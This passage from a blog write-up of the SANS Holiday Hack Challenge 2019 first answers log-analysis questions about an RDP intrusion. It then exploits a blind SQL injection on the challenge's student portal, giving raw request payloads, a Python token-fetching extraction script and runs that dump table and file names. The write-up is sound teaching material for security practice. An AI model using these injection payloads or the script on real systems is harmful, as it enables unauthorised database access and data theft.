<li>What is the time ( HH:MM:SS ) the attacker makes a Remote Desktop connection
to another machine?</li>
</ol>
<p>Now, I had a hard time answering this one. I <a class="reference external" href="https://graylog.elfu.org/streams/000000000000000000000001/search?rangetype=relative&amp;fields=message%2Csource&amp;width=1853&amp;highlightMessage=&amp;relative=0&amp;q=DestinationPort%3A3389">looked for events</a>
with <code>DestinationPort:3389</code>, and submitted the four different timestamps.
However, they were not the correct one. I thought that maybe I should submit
them with their UTC value, but to no avail.</p>
<p>I then tried bruteforcing every value between <code>05:59:00</code> and
<code>06:02:00</code>, but it was also a fail.</p>
<p>Finally, I manually tried every timestamp for the query <a class="reference external" href="https://graylog.elfu.org/streams/000000000000000000000001/search?rangetype=relative&amp;fields=message%2Csource&amp;width=1853&amp;highlightMessage=&amp;relative=0&amp;q=EventID%3A4624%20AND%20DestinationHostname%3Aelfu%5C-res%5C-wks2">EventID:4624 AND
DestinationHostname:&quot;elfu-res-wks2&quot;</a>
after <code>05:59:00</code>.</p>
<p>Turns out the correct one is <code>06:04:28</code>. After inputing the correct
answer, the report tells you:</p>
<blockquote>
LogonType 10 is used for successful network connections using the RDP
client.</blockquote>
<p>So, I guess I should have looked for <code>LogonType:10</code>, which indicates that
the connection is fully complete, whereas my first four timestamps were just
the establishment of the TCP connection.</p>
<ol class="arabic simple" start="8">
<li>The attacker navigates the file system of a third host using their Remote
Desktop Connection to the second host. What is the <strong>SourceHostName,DestinationHostname,LogonType</strong>
of this connection?</li>
</ol>
<p>Now, we know that the second host is <code>elfu-res-wks2</code>. If we keep looking
for Event ID 4624 with this <code>SourceHostName</code>, we
<a class="reference external" href="https://graylog.elfu.org/streams/000000000000000000000001/search?rangetype=relative&amp;fields=message%2Csource&amp;width=1853&amp;highlightMessage=&amp;relative=0&amp;q=SourceHostName%3A%22ELFU-RES-WKS2%22%20AND%20EventID%3A4624">find</a>
two values for <code>DestinationHostname</code>: <code>elfu-res-wks2</code> (our
original workstation) or <code>elfu-res-wks3</code>. The latter must be our third
host.</p>
<p>Let's add <code>DestinationHostname=&quot;elfu-res-wks3&quot;</code> to our previous query to
see the possible value for <code>LogonType</code>. We
<a class="reference external" href="https://graylog.elfu.org/streams/000000000000000000000001/search?rangetype=relative&amp;fields=message%2Csource&amp;width=1853&amp;highlightMessage=&amp;relative=0&amp;q=SourceHostName%3A%22ELFU-RES-WKS2%22%20AND%20EventID%3A4624%20AND%20DestinationHostname%3A%22elfu-res-wks3%22">find</a>
that the onlye <code>LogonType</code> is <code>3</code>.</p>
<p>Therefore, the CSV result is <code>elfu-res-wks2,elfu-res-wks3,3</code>.</p>
<ol class="arabic simple" start="9">
<li>What is the full-path + filename of the secret research document after being
transferred from the third host to the second host?</li>
</ol>
<p>Now, we can specify a <code>source=&quot;elfu-res-wks2&quot;</code> and look for file
creation. <a class="reference external" href="https://graylog.elfu.org/streams/000000000000000000000001/search?rangetype=relative&amp;fields=message%2Csource&amp;width=1853&amp;highlightMessage=&amp;relative=0&amp;q=source%3D%22elfu-res-wks2%22%20AND%20_exists_%3ATargetFilename">This query</a>
returns a few results. By looking through it, we can find the file
<code>C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf</code>.</p>
<ol class="arabic simple" start="10">
<li>What is the IPv4 address (as found in logs) the secret research document
was exfiltrated to?</li>
</ol>
<p>If we <a class="reference external" href="https://graylog.elfu.org/streams/000000000000000000000001/search?rangetype=relative&amp;fields=message%2Csource&amp;width=1853&amp;highlightMessage=&amp;relative=0&amp;q=super_secret_elfu_research.pdf">look for this file name</a>,
we can see that the file was exfiltraded to pastebin.com, via a PowerShell
command, with a PID of 1232. Let's look for this PID, and list the different
<code>DestinationIp</code> it communicated with.</p>
<p><a class="reference external" href="https://graylog.elfu.org/streams/000000000000000000000001/search?rangetype=relative&amp;fields=message%2Csource&amp;width=1853&amp;highlightMessage=&amp;relative=0&amp;q=ProcessId%3A1232%20AND%20_exists_%3ADestinationIp">This query</a>
gives us only one IP address: <code>104.22.3.84</code>.</p>
<p>Now that we have answered every question, we get the following message:</p>
<blockquote>
<p>Incident Response Report #7830984301576234 Submitted.</p>
<p>Incident Fully Detected!</p>
</blockquote>
</div>
<div class="section" id="retrieve-scraps-of-paper-from-server">
<h3><a class="toc-backref" href="#id33">Retrieve Scraps of Paper from Server</a></h3>
<p>Krampus is super happy that we managed to win the Frido Sleigh contest for him!</p>
<img alt="krampus.png" class="align-center" src="/images/sans-christmas-challenge-2019/small_krampus.png" />
<p><em>Krampus says</em></p>
<blockquote>
<p>You did it! Thank you so much. I can trust you!</p>
<p>To help you, I have flashed the firmware in your badge to unlock a useful
new feature: magical teleportation through the steam tunnels.</p>
<p>As for those scraps of paper, I scanned those and put the images on my
server.</p>
<p>I then threw the paper away.</p>
<p>Unfortunately, I managed to lock out my account on the server.</p>
<p>Hey! You’ve got some great skills. Would you please hack into my system and
retrieve the scans?</p>
<p>I give you permission to hack into it, solving Objective 9 in your badge.</p>
<p>And, as long as you're traveling around, be sure to solve any other
challenges you happen across.</p>
</blockquote>
<p>So, we must hack Krampus' system to recover the scraps of paper. Let's head
over to the <a class="reference external" href="https://studentportal.elfu.org/">Student Portal</a> and see what
we can do.</p>
<p>The portal presents the university, the different elvish students, and the
application process. It's possible to <a class="reference external" href="https://studentportal.elfu.org/apply.php">send an application</a>
and <a class="reference external" href="https://studentportal.elfu.org/check.php">check our application's status</a>.</p>
<p>Let's see what we can do on these pages:</p>
<div class="highlight"><pre><span></span><span class="nf">GET</span> <span class="nn">/validator.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">studentportal.elfu.org</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">*/*</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Server</span><span class="o">:</span> <span class="l">nginx/1.14.2</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">89</span>

MTAwOTkwNTY5MjE2MTU3Nzk3NzY0NDEwMDk5MDU2OS4yMTY=_MTI5MjY3OTI4NTk2NDgzMjMxNjk4MjE0LjkxMg==
</pre></div>
<div class="highlight"><pre><span></span><span class="nf">GET</span> <span class="nn">/application-check.php?elfmail=test@test.com&#39;&amp;token=MTAwOTkwNTY5MjE2MTU3Nzk3NzY0NDEwMDk5MDU2OS4yMTY%3D_MTI5MjY3OTI4NTk2NDgzMjMxNjk4MjE0LjkxMg%3D%3D</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">studentportal.elfu.org</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Server</span><span class="o">:</span> <span class="l">nginx/1.14.2</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">2927</span>

[...]
<span class="hll">Error: SELECT status FROM applications WHERE elfmail = &#39;test@test.com&#39;&#39;;&lt;br&gt;You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;&#39;test@test.fr&#39;&#39;&#39; at line 1
</span></pre></div>
<p>Couple of interesting things:</p>
<ul class="simple">
<li>First, we can see that before every submission to the form, a call is made to
<a class="reference external" href="https://studentportal.elfu.org/validator.php">https://studentportal.elfu.org/validator.php</a> to get a validation token, that
must be sent to the <a class="reference external" href="https://studentportal.elfu.org/application-check.php">https://studentportal.elfu.org/application-check.php</a> URL.</li>
<li>Second, we have a SQL injection! What's more, the error message is pretty
chatty, and gives us the complete SQL statement:</li>
</ul>
<div class="highlight"><pre><span></span><span class="k">SELECT</span> <span class="n">status</span> <span class="k">FROM</span> <span class="n">applications</span> <span class="k">WHERE</span> <span class="n">elfmail</span> <span class="o">=</span> <span class="s1">&#39;&lt;user_input_goes_here&gt;&#39;</span><span class="p">;</span>
</pre></div>
<p>We can use this SQL injection to dump the content of the database. However,
this does not look to be a <a class="reference external" href="http://www.sqlinjection.net/union/">UNION-exploitable SQL injection</a>.
However, it seems that it could be a <a class="reference external" href="https://www.owasp.org/index.php/Blind_SQL_Injection">boolean-based blin SQL injection</a>.</p>
<p>Let's say we use this as our user input:</p>
<pre class="literal-block">
garbage&#64;garbage.com' OR '1'='1
</pre>
<p>The SQL statement becomes:</p>
<div class="highlight"><pre><span></span><span class="k">SELECT</span> <span class="n">status</span> <span class="k">FROM</span> <span class="n">applications</span> <span class="k">WHERE</span> <span class="n">elfmail</span> <span class="o">=</span> <span class="s1">&#39;garbage@garbage.com&#39;</span> <span class="k">OR</span> <span class="s1">&#39;1&#39;</span><span class="o">=</span><span class="s1">&#39;1&#39;</span><span class="p">;</span>
</pre></div>
<p>The <code>WHERE</code> part of the statement will always be true, because of the
<code>OR '1'='1'</code> part. So, it will return the status of the first
application, which is still pending:</p>
<div class="highlight"><pre><span></span><span class="nf">GET</span> <span class="nn">/application-check.php?elfmail=garbage%40garbage.com&#39;+OR+&#39;1&#39;%3d&#39;1&amp;token=MTAwOTkwNjMxMTY4MTU3Nzk3ODYxMjEwMDk5MDYzMS4xNjg%3D_MTI5MjY4MDA3ODk1MDQzMjMxNzAwMTk3LjM3Ng%3D%3D</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">studentportal.elfu.org</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Server</span><span class="o">:</span> <span class="l">nginx/1.14.2</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">text/html; charset=UTF-8</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">2723</span>

[...]
Your application is still pending!
[...]
</pre></div>
<p>Now, if we use this as our user input:</p>
<pre class="literal-block">
garbage&#64;garbage.com' OR '1'='0
</pre>
<p>The SQL statement becomes:</p>
<div class="highlight"><pre><span></span><span class="k">SELECT</span> <span class="n">status</span> <span class="k">FROM</span> <span class="n">applications</span> <span class="k">WHERE</span> <span class="n">elfmail</span> <span class="o">=</span> <span class="s1">&#39;garbage@garbage.com&#39;</span> <span class="k">OR</span> <span class="s1">&#39;1&#39;</span><span class="o">=</span><span class="s1">&#39;0&#39;</span><span class="p">;</span>
</pre></div>
<p>Now, the <code>OR</code> clause in our <code>WHERE</code> statement is always false
(because 1 is never equal to 0). So the statement will return the status for
our email address <code>garbage&#64;garbage.com</code>, which does not exist in the
database. Therefore, our application is not found:</p>
<div class="highlight"><pre><span></span><span class="nf">GET</span> <span class="nn">/application-check.php?elfmail=garbage%40garbage.com&#39;+OR+&#39;1&#39;%3d&#39;0&amp;token=MTAwOTkwNjMzOTg0MTU3Nzk3ODY1NjEwMDk5MDYzMy45ODQ%3D_MTI5MjY4MDExNDk5NTIzMjMxNzAwMjg3LjQ4OA%3D%3D</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">studentportal.elfu.org</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Server</span><span class="o">:</span> <span class="l">nginx/1.14.2</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">text/html; charset=UTF-8</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">2710</span>

[...]
No application found!
[...]
</pre></div>
<p>We now have a way to evaluate boolean statements. If our statement is true,
the server will return &quot;Your application is still pending!&quot;. If it's false, it
will return &quot;No application found!&quot;.</p>
<p>Let's say we want to find the first letter of the current database. We can
input:</p>
<pre class="literal-block">
garbage&#64;garbage.com' OR (SELECT MID(DATABASE(),0,1))='a
</pre>
<p>If the first letter is <code>a</code>, the server will answer &quot;Your application is
still pending!&quot;. If not, it will answer &quot;No application found!&quot;:</p>
<div class="highlight"><pre><span></span><span class="nf">GET</span> <span class="nn">/application-check.php?elfmail=garbage%40garbage.com&#39;+OR+(SELECT+MID(DATABASE(),1,1))%3d&#39;a&amp;token=MTAwOTkwNjc5NDI0MTU3Nzk3OTM2NjEwMDk5MDY3OS40MjQ%3D_MTI5MjY4MDY5NjYyNzIzMjMxNzAxNzQxLjU2OA%3D%3D</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">studentportal.elfu.org</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Server</span><span class="o">:</span> <span class="l">nginx/1.14.2</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">text/html; charset=UTF-8</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">2710</span>

[...]
No application found!
[...]
</pre></div>
<p>So, the first letter is not <code>a</code>. We keep trying letters, until finally:</p>
<div class="highlight"><pre><span></span><span class="nf">GET</span> <span class="nn">/application-check.php?elfmail=garbage%40garbage.com&#39;+OR+(SELECT+MID(DATABASE(),1,1))%3d&#39;e&amp;token=MTAwOTkwNjc5NDI0MTU3Nzk3OTM2NjEwMDk5MDY3OS40MjQ%3D_MTI5MjY4MDY5NjYyNzIzMjMxNzAxNzQxLjU2OA%3D%3D</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">studentportal.elfu.org</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Server</span><span class="o">:</span> <span class="l">nginx/1.14.2</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">text/html; charset=UTF-8</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">2710</span>

[...]
Your application is still pending!
[...]
</pre></div>
<p>So, the first letter of the database is <code>e</code>. We can now find the next
letter. If we keep going, we'll find that the data base is <code>elfu</code>.</p>
<p>Awesome, we can extract information from the database! Let's automate the
process, because doing this manually takes too much time. Luckily for me, I've
written in the past <a class="reference external" href="https://github.com/the-useless-one/blind_injection">a little Python script</a>
to help me exploit blind SQL injection. We just have to make a few
modifications to the <code>injection.py</code> file, to modify the syntax of the
injection, and to call the validator URL to get our validation token before
every request:</p>
<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">injection</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span> <span class="n">string</span><span class="p">,</span> <span class="n">column</span><span class="p">,</span> <span class="n">table</span><span class="p">,</span> <span class="n">where</span><span class="p">,</span> <span class="n">index</span><span class="p">):</span>
    <span class="n">token_url</span> <span class="o">=</span> <span class="s1">&#39;https://studentportal.elfu.org/validator.php&#39;</span>

    <span class="k">print</span><span class="p">(</span><span class="s1">&#39;[wait] retrieving data:&#39;</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s1">&#39;</span><span class="se">\t</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
    <span class="n">data</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
    <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span>

    <span class="c1"># While we don&#39;t have the entire data</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">char</span> <span class="o">=</span> <span class="mi">0</span>
        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">8</span><span class="p">):</span>
            <span class="c1"># The injection performed here is URL-based</span>
            <span class="c1"># To use another mean of injection (HTTP Headers, Cookies...)</span>
            <span class="c1"># change the crafting between the hashtags</span>

            <span class="c1">#### CHANGE HERE</span>
            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">token_url</span><span class="p">)</span>
            <span class="n">token</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span>

            <span class="k">if</span> <span class="s1">&#39;?&#39;</span> <span class="ow">in</span> <span class="n">target_url</span><span class="p">:</span>
                <span class="n">separator</span> <span class="o">=</span> <span class="s1">&#39;&amp;&#39;</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">separator</span> <span class="o">=</span> <span class="s1">&#39;?&#39;</span>

            <span class="n">url</span> <span class="o">=</span> <span class="n">target_url</span> <span class="o">+</span> <span class="n">separator</span> <span class="o">+</span> <span class="s2">&quot;elfmail=garbage@garbage.com&#39; OR &quot;</span> <span class="o">+</span> \
                    <span class="s2">&quot;(select mid(lpad(bin(ord(mid({0},{1},1))),7,&#39;0&#39;),{2},1) &quot;</span> <span class="o">+</span> \
                    <span class="s2">&quot;from {3} {4} &quot;</span> <span class="o">+</span> \
                    <span class="s2">&quot;limit {5},1)=&#39;1&amp;token={6}&quot;</span>
            <span class="n">url</span> <span class="o">=</span> <span class="n">url</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">column</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">,</span> <span class="n">table</span><span class="p">,</span> <span class="n">where</span><span class="p">,</span> <span class="n">index</span><span class="p">,</span> <span class="n">token</span><span class="p">)</span>

            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
            <span class="c1">#### END OF CHANGE</span>
</pre></div>
<p>Now, you can see that the syntax of the injection is a little bit different
from what I show earlier. Let's break it down:</p>
<div class="highlight"><pre><span></span><span class="k">SELECT</span> <span class="n">MID</span><span class="p">(</span><span class="n">LPAD</span><span class="p">(</span><span class="n">BIN</span><span class="p">(</span><span class="n">ORD</span><span class="p">(</span><span class="n">MID</span><span class="p">(</span><span class="o">&lt;</span><span class="k">column_name</span><span class="o">&gt;</span><span class="p">,</span><span class="o">&lt;</span><span class="n">index_i</span><span class="o">&gt;</span><span class="p">,</span><span class="mi">1</span><span class="p">))),</span><span class="mi">7</span><span class="p">,</span><span class="s1">&#39;0&#39;</span><span class="p">),</span><span class="o">&lt;</span><span class="n">index_j</span><span class="o">&gt;</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span> <span class="k">FROM</span> <span class="o">&lt;</span><span class="k">table_name</span><span class="o">&gt;</span>
</pre></div>
<ul class="simple">
<li>I first call <code>MID</code> to retrieve a particular character from the data.</li>
<li>I then call <code>ORD</code>, to get the ASCII code of this letter.</li>
<li>I then call <code>BIN</code>, to convert this ASCII code to binary.</li>
<li>Then, I call <code>LPAD(___, 7, '0')</code> to pad this binary string with zeros,
until it has a length of 7.</li>
<li>I then call <code>MID</code> again, to extract a particular bit from this binary
string.</li>
<li>I then test to see if this bit is equal to one or not.</li>
</ul>
<p>This allows me to retrieve the string I'm interested in bit by bit, instead of
character by character. It's a little bit faster.</p>
<p>So, let's run this script to retrieve information from the database. First,
let's get the different tables for the <code>elfu</code> database:</p>
<div class="highlight"><pre><span></span>$ ./blind_injection.py -u <span class="s2">&quot;https://studentportal.elfu.org/application-check.php&quot;</span> -s <span class="s1">&#39;still pending!&#39;</span> -c table_name -t information_schema.tables -w <span class="s2">&quot;WHERE table_schema=&#39;elfu&#39;&quot;</span> -i <span class="m">0</span>
Blind Injection <span class="o">(</span>Copyright <span class="m">2014</span> Yannick Méheut &lt;useless <span class="o">(</span>at<span class="o">)</span> utouch <span class="o">(</span>dot<span class="o">)</span> fr&gt;<span class="o">)</span>

<span class="o">[</span><span class="k">done</span><span class="o">]</span> retrieving data:    applications
<span class="hll">found: applications
</span>$ ./blind_injection.py -u <span class="s2">&quot;https://studentportal.elfu.org/application-check.php&quot;</span> -s <span class="s1">&#39;still pending!&#39;</span> -c table_name -t information_schema.tables -w <span class="s2">&quot;WHERE table_schema=&#39;elfu&#39;&quot;</span> -i <span class="m">1</span>
Blind Injection <span class="o">(</span>Copyright <span class="m">2014</span> Yannick Méheut &lt;useless <span class="o">(</span>at<span class="o">)</span> utouch <span class="o">(</span>dot<span class="o">)</span> fr&gt;<span class="o">)</span>

<span class="o">[</span><span class="k">done</span><span class="o">]</span> retrieving data:    krampus
<span class="hll">found: krampus
</span>$ ./blind_injection.py -u <span class="s2">&quot;https://studentportal.elfu.org/application-check.php&quot;</span> -s <span class="s1">&#39;still pending!&#39;</span> -c table_name -t information_schema.tables -w <span class="s2">&quot;WHERE table_schema=&#39;elfu&#39;&quot;</span> -i <span class="m">2</span>
Blind Injection <span class="o">(</span>Copyright <span class="m">2014</span> Yannick Méheut &lt;useless <span class="o">(</span>at<span class="o">)</span> utouch <span class="o">(</span>dot<span class="o">)</span> fr&gt;<span class="o">)</span>

<span class="o">[</span><span class="k">done</span><span class="o">]</span> retrieving data:    students
<span class="hll">found: students
</span>$ ./blind_injection.py -u <span class="s2">&quot;https://studentportal.elfu.org/application-check.php&quot;</span> -s <span class="s1">&#39;still pending!&#39;</span> -c table_name -t information_schema.tables -w <span class="s2">&quot;WHERE table_schema=&#39;elfu&#39;&quot;</span> -i <span class="m">3</span>
Blind Injection <span class="o">(</span>Copyright <span class="m">2014</span> Yannick Méheut &lt;useless <span class="o">(</span>at<span class="o">)</span> utouch <span class="o">(</span>dot<span class="o">)</span> fr&gt;<span class="o">)</span>

<span class="o">[</span><span class="k">done</span><span class="o">]</span> retrieving data:
no result found
</pre></div>
<p>Alright, the table <code>krampus</code> seems interesting. Let's see the columns of
this table:</p>
<div class="highlight"><pre><span></span>$ ./blind_injection.py -u <span class="s2">&quot;https://studentportal.elfu.org/application-check.php&quot;</span> -s <span class="s1">&#39;still pending!&#39;</span> -c column_name -t information_schema.columns -w <span class="s2">&quot;WHERE table_name=&#39;krampus&#39;&quot;</span> -i <span class="m">0</span>
Blind Injection <span class="o">(</span>Copyright <span class="m">2014</span> Yannick Méheut &lt;useless <span class="o">(</span>at<span class="o">)</span> utouch <span class="o">(</span>dot<span class="o">)</span> fr&gt;<span class="o">)</span>

<span class="o">[</span><span class="k">done</span><span class="o">]</span> retrieving data: id
<span class="hll">found: id
</span>$ ./blind_injection.py -u <span class="s2">&quot;https://studentportal.elfu.org/application-check.php&quot;</span> -s <span class="s1">&#39;still pending!&#39;</span> -c column_name -t information_schema.columns -w <span class="s2">&quot;WHERE table_name=&#39;krampus&#39;&quot;</span> -i <span class="m">1</span>
Blind Injection <span class="o">(</span>Copyright <span class="m">2014</span> Yannick Méheut &lt;useless <span class="o">(</span>at<span class="o">)</span> utouch <span class="o">(</span>dot<span class="o">)</span> fr&gt;<span class="o">)</span>

<span class="o">[</span><span class="k">done</span><span class="o">]</span> retrieving data: path
<span class="hll">found: path
</span>$ ./blind_injection.py -u <span class="s2">&quot;https://studentportal.elfu.org/application-check.php&quot;</span> -s <span class="s1">&#39;still pending!&#39;</span> -c column_name -t information_schema.columns -w <span class="s2">&quot;WHERE table_name=&#39;krampus&#39;&quot;</span> -i <span class="m">2</span>
Blind Injection <span class="o">(</span>Copyright <span class="m">2014</span> Yannick Méheut &lt;useless <span class="o">(</span>at<span class="o">)</span> utouch <span class="o">(</span>dot<span class="o">)</span> fr&gt;<span class="o">)</span>

<span class="o">[</span><span class="k">done</span><span class="o">]</span> retrieving data:
no result found
</pre></div>
<p>Two columns, <code>id</code> and <code>path</code>. Let's extract data from the
<code>path</code> column:</p>
<div class="highlight"><pre><span></span>$ ./blind_injection.py -u <span class="s2">&quot;https://studentportal.elfu.org/application-check.php&quot;</span> -s <span class="s1">&#39;still pending!&#39;</span> -c path -t krampus -i <span class="m">0</span>
Blind Injection <span class="o">(</span>Copyright <span class="m">2014</span> Yannick Méheut &lt;useless <span class="o">(</span>at<span class="o">)</span> utouch <span class="o">(</span>dot<span class="o">)</span> fr&gt;<span class="o">)</span>

<span class="o">[</span><span class="k">done</span><span class="o">]</span> retrieving data:    /krampus/0f5f510e.png
found: /krampus/0f5f510e.png
$ ./blind_injection.py -u <span class="s2">&quot;https://studentportal.elfu.org/application-check.php&quot;</span> -s <span class="s1">&#39;still pending!&#39;</span> -c path -t krampus -i <span class="m">1</span>
Blind Injection <span class="o">(</span>Copyright <span class="m">2014</span> Yannick Méheut &lt;useless <span class="o">(</span>at<span class="o">)</span> utouch <span class="o">(</span>dot<span class="o">)</span> fr&gt;<span class="o">)</span>

<span class="o">[</span><span class="k">done</span><span class="o">]</span> retrieving data:    /krampus/1cc7e121.png
found: /krampus/1cc7e121.png
$ ./blind_injection.py -u <span class="s2">&quot;https://studentportal.elfu.org/application-check.php&quot;</span> -s <span class="s1">&#39;still pending!&#39;</span> -c path -t krampus -i <span class="m">2</span>
Blind Injection <span class="o">(</span>Copyright <span class="m">2014</span> Yannick Méheut &lt;useless <span class="o">(</span>at<span class="o">)</span> utouch <span class="o">(</span>dot<span class="o">)</span> fr&gt;<span class="o">)</span>

<span class="o">[</span><span class="k">done</span><span class="o">]</span> retrieving data:    /krampus/439f15e6.png
found: /krampus/439f15e6.png
$ ./blind_injection.py -u <span class="s2">&quot;https://studentportal.elfu.org/application-check.php&quot;</span> -s <span class="s1">&#39;still pending!&#39;</span> -c path -t krampus -i <span class="m">3</span>
Blind Injection <span class="o">(</span>Copyright <span class="m">2014</span> Yannick Méheut &lt;useless <span class="o">(</span>at<span class="o">)</span> utouch <span class="o">(</span>dot<span class="o">)</span> fr&gt;<span class="o">)</span>

<span class="o">[</span><span class="k">done</span><span class="o">]</span> retrieving data:    /krampus/667d6896.png
found: /krampus/667d6896.png
$ ./blind_injection.py -u <span class="s2">&quot;https://studentportal.elfu.org/application-check.php&quot;</span> -s <span class="s1">&#39;still pending!&#39;</span> -c path -t krampus -i <span class="m">4</span>
Blind Injection <span class="o">(</span>Copyright <span class="m">2014</span> Yannick Méheut &lt;useless <span class="o">(</span>at<span class="o">)</span> utouch <span class="o">(</span>dot<span class="o">)</span> fr&gt;<span class="o">)</span>

<span class="o">[</span><span class="k">done</span><span class="o">]</span> retrieving data:    /krampus/adb798ca.png
found: /krampus/adb798ca.png
$ ./blind_injection.py -u <span class="s2">&quot;https://studentportal.elfu.org/application-check.php&quot;</span> -s <span class="s1">&#39;still pending!&#39;</span> -c path -t krampus -i <span class="m">5</span>
Blind Injection <span class="o">(</span>Copyright <span class="m">2014</span> Yannick Méheut &lt;useless <span class="o">(</span>at<span class="o">)</span> utouch <span class="o">(</span>dot<span class="o">)</span> fr&gt;<span class="o">)</span>

<span class="o">[</span><span class="k">done</span><span class="o">]</span> retrieving data:    /krampus/ba417715.png
found: /krampus/ba417715.png
$ ./blind_injection.py -u <span class="s2">&quot;https://studentportal.elfu.org/application-check.php&quot;</span> -s <span class="s1">&#39;still pending!&#39;</span> -c path -t krampus -i <span class="m">6</span>
Blind Injection <span class="o">(</span>Copyright <span class="m">2014</span> Yannick Méheut &lt;useless <span class="o">(</span>at<span class="o">)</span> utouch <span class="o">(</span>dot<span class="o">)</span> fr&gt;<span class="o">)</span>

<span class="o">[</span><span class="k">done</span><span class="o">]</span> retrieving data:
no result found
</pre></div>
<p>We found six different paths to PNG files. We can download them from the
Student Portal. Weirdly enough, I couldn't download these files from my
browser, I had to download them using <code>wget</code>. Anyway, here are the six
scraps of paper we were searching:</p>
<ul class="simple">
<li><a class="reference external" href="/images/sans-christmas-challenge-2019/0f5f510e.png">First scrap</a></li>
<li><a class="reference external" href="/images/sans-christmas-challenge-2019/1cc7e121.png">Second scrap</a></li>
<li><a class="reference external" href="/images/sans-christmas-challenge-2019/439f15e6.png">Third scrap</a></li>
<li><a class="reference external" href="/images/sans-christmas-challenge-2019/667d6896.png">Fourth scrap</a></li>
<li><a class="reference external" href="/images/sans-christmas-challenge-2019/adb798ca.png">Fifth scrap</a></li>
